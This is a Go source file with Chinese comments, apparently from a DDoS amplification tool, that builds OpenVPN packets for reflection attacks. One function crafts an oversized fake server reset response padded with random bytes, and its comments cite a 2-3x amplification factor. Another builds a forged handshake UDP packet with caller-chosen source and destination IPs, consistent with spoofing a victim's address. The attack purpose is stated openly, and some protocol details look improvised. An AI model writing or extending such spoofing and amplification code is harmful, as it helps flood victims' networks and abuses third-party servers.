package protocol

import (
	"bytes"
	"math/rand"
	"time"
)

// OPENVPNResponseBuffer 生成OpenVPN反射响应
// 放大倍数：约2-3倍
func OPENVPNResponseBuffer() []byte {
	// OpenVPN使用基于TLS的控制通道和数据通道
	// 我们模拟一个P_CONTROL_HARD_RESET_SERVER_V2型的响应包
	var buf bytes.Buffer
	
	// OpenVPN数据包结构:
	// 1字节: 操作码 (0x40 = P_CONTROL_HARD_RESET_SERVER_V2)
	// 8字节: 会话ID
	// 20字节: HMAC签名
	// 4字节: 包序列号
	// 4字节: 时间戳
	// 1字节: 消息数组长度
	// N字节: 消息内容
	
	// 开始构建数据包
	
	// 操作码: P_CONTROL_HARD_RESET_SERVER_V2 (0x40)
	buf.WriteByte(0x40)
	
	// 会话ID (8个随机字节)
	sessionID := make([]byte, 8)
	rand.Read(sessionID)
	buf.Write(sessionID)
	
	// HMAC签名 (20字节，这里简化为零)
	hmac := make([]byte, 20)
	buf.Write(hmac)
	
	// 包序列号 (4个随机字节)
	packetID := make([]byte, 4)
	rand.Read(packetID)
	buf.Write(packetID)
	
	// 时间戳 (4字节，当前UNIX时间)
	timestamp := time.Now().Unix()
	timeBytes := []byte{
		byte(timestamp >> 24),
		byte(timestamp >> 16),
		byte(timestamp >> 8),
		byte(timestamp),
	}
	buf.Write(timeBytes)
	
	// 消息数组长度 (此处为1)
	buf.WriteByte(0x01)
	
	// 构建一个大的TLS控制消息以实现放大
	tlsControlMsg := make([]byte, 400)
	rand.Read(tlsControlMsg)
	
	// TLS控制消息长度 (2字节)
	msgLen := len(tlsControlMsg)
	buf.WriteByte(byte(msgLen >> 8))
	buf.WriteByte(byte(msgLen))
	
	// TLS控制消息内容
	buf.Write(tlsControlMsg)
	
	// 添加额外的选项和参数以增加大小
	// 在真实实现中，这些会是实际的配置数据
	extraOptions := []byte{
		// TLS加密参数
		0x01, 0x08, 'A', 'E', 'S', '-', '2', '5', '6', '-',
		// 压缩参数
		0x02, 0x04, 'L', 'Z', 'O', '-',
		// 认证参数
		0x03, 0x08, 'S', 'H', 'A', '2', '-', '5', '1', '2',
		// 协议版本
		0x04, 0x05, '2', '.', '4', '.', '9',
	}
	buf.Write(extraOptions)
	
	// 添加随机填充，使响应更大
	padding := make([]byte, 100)
	rand.Read(padding)
	buf.Write(padding)
	
	return buf.Bytes()
}

func OpenVPNPacket(srcIP, dstIP string, srcPort, dstPort int) ([]byte, error) {
	// 构造伪造的初始握手包
	payload := []byte{
		0x38, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x44, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	}
	return BuildUDPPacket(srcIP, dstIP, srcPort, dstPort, payload)
}
